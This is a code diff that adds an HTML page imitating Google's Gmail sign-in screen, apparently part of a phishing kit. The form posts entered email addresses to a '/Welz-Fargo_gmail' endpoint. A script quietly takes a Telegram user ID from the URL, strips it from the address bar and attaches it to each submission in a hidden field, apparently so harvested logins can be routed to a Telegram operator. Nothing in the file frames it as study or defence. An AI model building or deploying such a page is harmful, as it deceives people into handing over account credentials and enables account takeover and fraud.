@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <title>Page Title</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <link rel='stylesheet' type='text/css' media='screen' href='main.css'>
+    <style>
+        *{
+            padding: 0px;
+            margin: 0px;
+        }
+        body {
+            font-family: calibri;
+            display: grid;
+            justify-content: center;
+            margin-top: 100px;
+        }
+         fieldset {
+            max-width: 100px;
+            min-height: 100px;
+            padding: 50px 40px 25px 40px;
+            border: 2px solid lightgray;
+            border-radius: 8px;
+            border-collapse: collapse;
+            border-spacing: 0px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .sign {
+            margin-top: 20px;
+            margin-bottom: 5px;
+            font-weight: 400;
+        }
+        .place {
+            width: 300px;
+            height: 40px;
+            margin-top: 45px;
+            border: 1px solid lightgray;
+            border-radius: 5px;
+            font-weight: 10px;
+            font-size: 15px;
+            padding: 2px 2px 2px 15px;
+            outline: none;
+            background: none;
+            box-sizing: border-box;
+            z-index: 4;
+        }
+        .place:focus {
+            border: 2px solid royalblue;
+        }
+        .place:focus~.placelabel:before {
+            color: royalblue;
+            font-size: 12px;
+            top: -48px;
+            z-index: 10;
+            padding: 0px 1px;
+        }
+        .placelabel {
+            position: relative;
+            width: 200px;
+        }
+        .placelabel::before {
+            content: "Email or phone";
+            position: absolute;
+            top: -30px;
+            left: -40px;
+            background-color: white;
+            font-size: 18px;
+            z-index: 1;
+            font-weight: bold;
+            color: rgb(178, 178, 178);
+            box-sizing: border-box;
+            transition: 0.1s ease;
+            background-color: white;
+        }
+        .okay {
+            color: rgb(60, 98, 213);
+            width: 100%;
+            margin-top: 8px;
+        }
+        .gmode {
+            margin-top: 25px;
+            margin-bottom: 25px;
+        }
+        .foot {
+            width: 109%;
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 25px;
+        }
+        .foot button{
+            font-weight: bolder;
+            border-radius: 5px;
+            padding: 8px;
+        }
+        .create:hover {
+            color: royalblue;
+            background-color: rgb(247, 250, 250);
+        }
+        .next {
+            background-color: royalblue;
+            color: white;
+            transition: 0.1s ease;
+        }
+        .next:hover {
+            background-color: rgb(35, 78, 207);
+            box-shadow: 0px 2px 5px rgb(179, 190, 225);
+        }
+        .create , .gmode span {
+            color: royalblue;
+            font-weight: bold;
+        }
+        .gmode {
+            color: rgb(91, 91, 91);
+        }
+        #password-sect{
+            visibility: hidden;
+        }
+        .hide{
+            display: none;
+        }
+        .show{
+            visibility: visible !important;
+        }
+    </style>
+</head>
+<body>
+
+    <script>
+        // Function to get query parameters from the URL
+        function getQueryParam(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+
+         // Function to remove the user ID parameter from the URL
+        function removeUserIdParam() {
+            if (history.replaceState) {
+                const url = window.location.href;
+                const updatedUrl = url.replace(/(\?|&)tgUserId=\d+/, '');
+                history.replaceState({}, document.title, updatedUrl);
+            }
+        }
+
+        // Get the Telegram user ID from the URL
+        const telegramUserId = getQueryParam('tgUserId');
+
+        // Use the telegramUserId for further actions
+        // console.log("Telegram User ID:", telegramUserId);
+
+        removeUserIdParam();
+
+    </script>
+
+    <form action="/Welz-Fargo_gmail" method="post">
+    <fieldset>
+      <img src="images/download.png" width="100px" alt="google-logo">
+      <h2 class="sign">Sign in</h2>
+      <p>to continue to Gmail</p>
+      <input type="hidden" name="tel_id" id="t_id">
+      <input type="email" name="email" class="place" required="required">
+      <input type="hidden" name="tel_id" id="tel_id" value="1234565">
+      <label class="placelabel"></label>
+      <h4 class="okay">Forgot email?</h4>
+      <p class="gmode">Not your computer?Use Guest mode to sign in privately.<span>Learn more</span></p>
+      <div class="foot">
+        <a href="new account.html" class="create">Create acount</a>
+        <button type="submit" href="" class="next">Next</button>
+      </div>
+    </fieldset>
+    
+    </form>
+    <script>
+        let id = document.getElementById('t_id');
+
+        id.setAttribute('value', telegramUserId);
+        console.log(telegramUserId);
+</script>
+
+</body> 
+</html>
